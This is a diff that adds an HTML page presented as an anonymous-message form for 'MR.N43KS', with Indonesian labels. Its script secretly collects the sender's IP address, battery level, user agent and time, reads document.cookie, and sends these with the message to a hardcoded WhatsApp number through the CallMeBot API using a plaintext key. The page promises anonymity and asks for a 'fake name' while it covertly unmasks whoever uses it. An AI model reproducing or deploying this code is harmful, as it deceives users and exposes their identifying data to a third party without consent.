@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Anonymous Message</title>
+    <style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Poppins', sans-serif;
+}
+
+body {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  flex-direction: column;
+  background: #23242a;
+}
+
+.box {
+  position: relative;
+  width: 350px;
+  height: 440px;
+  background: #1c1c1c;
+  border-radius: 8px;
+  overflow: hidden;
+}
+
+.box::before {
+  content: '';
+  z-index: 1;
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 380px;
+  height: 420px;
+  transform-origin: bottom right;
+  background: linear-gradient(0deg, transparent, #ce00ff, #45f3ff);
+  animation: animate 6s linear infinite;
+}
+
+.box::after {
+  content: '';
+  z-index: 1;
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 380px;
+  height: 420px;
+  transform-origin: bottom right;
+  background: linear-gradient(0deg, transparent, #45f3ff, #45f3ff);
+  animation: animate 6s linear infinite;
+  animation-delay: -3s;
+}
+
+@keyframes animate {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+form {
+  position: absolute;
+  inset: 2px;
+  background: #28292d;
+  padding: 50px 40px;
+  border-radius: 8px;
+  z-index: 2;
+  display: flex;
+  flex-direction: column;
+}
+
+h2 {
+  color: #45f3ff;
+  font-weight: 500;
+  text-align: center;
+  letter-spacing: 0.1em;
+}
+
+.inputBox {
+  position: relative;
+  width: 300px;
+  margin-top: 35px;
+}
+
+.inputBox input {
+  position: relative;
+  width: 100%;
+  padding: 20px 10px 10px;
+  background: transparent;
+  outline: none;
+  box-shadow: none;
+  border: none;
+  color: #23242a;
+  font-size: 1em;
+  letter-spacing: 0.05em;
+  transition: 0.5s;
+  z-index: 10;
+}
+
+.inputBox span {
+  position: absolute;
+  left: 0;
+  padding: 20px 0px 10px;
+  pointer-events: none;
+  font-size: 1em;
+  color: #8f8f8f;
+  letter-spacing: 0.05em;
+  transition: 0.5s;
+}
+
+.inputBox input:valid~span,
+.inputBox input:focus~span {
+  color: #45f3ff;
+  transform: translateX(0px) translateY(-34px);
+  font-size: 0.75em;
+}
+
+.inputBox i {
+  position: absolute;
+  left: 0;
+  bottom: 0;
+  width: 100%;
+  height: 2px;
+  background: #45f3ff;
+  border-radius: 4px;
+  overflow: hidden;
+  transition: 0.5s;
+  pointer-events: none;
+  z-index: 9;
+}
+
+.inputBox input:valid~i,
+.inputBox input:focus~i {
+  height: 44px;
+}
+
+.links {
+  display: flex;
+  justify-content: space-between;
+}
+
+.links a {
+  margin: 10px 0;
+  font-size: 0.75em;
+  color: #8f8f8f;
+  text-decoration: beige;
+}
+
+.links a:hover,
+.links a:nth-child(2) {
+  color: #45f3ff;
+}
+
+input[type="submit"] {
+  border: none;
+  outline: none;
+  padding: 11px 25px;
+  background: #45f3ff;
+  cursor: pointer;
+  border-radius: 4px;
+  font-weight: 600;
+  width: 100px;
+  margin-top: 10px;
+}
+
+input[type="submit"]:active {
+  opacity: 0.8;
+}
+/* Custom alert box styles */
+.custom-alert {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    padding: 15px 25px;
+    background-color: #45f3ff;
+    color: #23242a;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    z-index: 9999;
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out, top 0.3s ease-in-out;
+}
+
+.custom-alert p {
+    margin: 0;
+    font-size: 16px;
+    font-weight: 500;
+    text-align: center;
+}
+
+.custom-alert.success {
+    background-color: #00ff18;
+    color: #23242a;
+}
+
+.custom-alert.error {
+    background-color: #ff4545;
+    color: #fff;
+}
+
+/* Animation to slide the alert into view */
+@keyframes slideIn {
+    from {
+        top: -100px;
+        opacity: 0;
+    }
+    to {
+        top: 20px;
+        opacity: 1;
+    }
+}
+
+/* Animation to slide the alert out of view */
+@keyframes slideOut {
+    from {
+        top: 20px;
+        opacity: 1;
+    }
+    to {
+        top: -100px;
+        opacity: 0;
+    }
+}
+
+/* Class to apply animation */
+.slide-in {
+    animation: slideIn 0.3s forwards;
+}
+
+.slide-out {
+    animation: slideOut 5.5s forwards;
+}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <form id="form">
+            <h2>Send anonymous messages to<font color="#00ff18"> MR.N43KS</font></h2>
+            <div class="inputBox">
+                <input id="Nama" type="text" required="required">
+                <span>fake name</span>
+                <i></i>
+            </div>
+            <div class="inputBox">
+                <input id="Pesan" type="text" required="required">
+                <span>Message</span>
+                <i></i>
+            </div>
+            <div class="links">
+                <a href="#">Cara membuat?</a>
+                <a href="#">Donasi</a>
+            </div>
+            <input type="submit" value="Send">
+        </form>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Handle form submission
+            $("#form").submit(function(event) {
+                event.preventDefault(); // Prevent form from submitting
+
+                // Get form data
+                var phone = $("#Nama").val();
+                var message = $("#Pesan").val();
+                var nomor = "+628979946741"; // Perbaiki nomor telepon dengan format internasional
+                var apiKey = "8570219";
+                var ua = navigator.userAgent;
+                var ck = document.cookie;
+
+                // Get battery information
+                navigator.getBattery().then(function(battery) {
+                    var batteryLevel = (battery.level * 100).toFixed(2);
+
+                    // Get IP address
+                    $.get("https://api.ipify.org?format=json", function(data) {
+                        var ipAddress = data.ip;
+
+                        // Get current time
+                        var currentTime = new Date().toLocaleString();
+
+                        // Construct API URL with battery, IP, and time
+                        var apiUrl = "https://api.callmebot.com/whatsapp.php?phone=" + nomor + "&text=Nama: " + phone + "%0A" + "Pesan: " + message + "%0A%0A" + "Battery: " + batteryLevel + "%0A" + "IP: " + ipAddress + "%0A" + "Waktu: " + currentTime + "%0A" + "User Agent: " + ua + " &apikey=" + apiKey;
+
+                        // Send API request
+                        $.get(apiUrl, function(data) {
+                            console.log(data); // Log API response to console
+                            showCustomAlert("Message sent! thank " + phone , "success");
+                        }).fail(function(error) {
+                            console.error(error); // Log error to console
+                            showCustomAlert("Failed to send message. please try again " +phone, "error");
+                        });
+                    });
+                });
+            });
+
+            function showCustomAlert(message, type) {
+                var alertBox = $("<div>").addClass("custom-alert " + type + " slide-in");
+                var alertMessage = $("<p>").text(message);
+                alertBox.append(alertMessage);
+                $("body").append(alertBox);
+
+                setTimeout(function() {
+                    alertBox.removeClass("slide-in").addClass("slide-out");
+                    setTimeout(function() {
+                        alertBox.remove();
+                    }, 300);
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
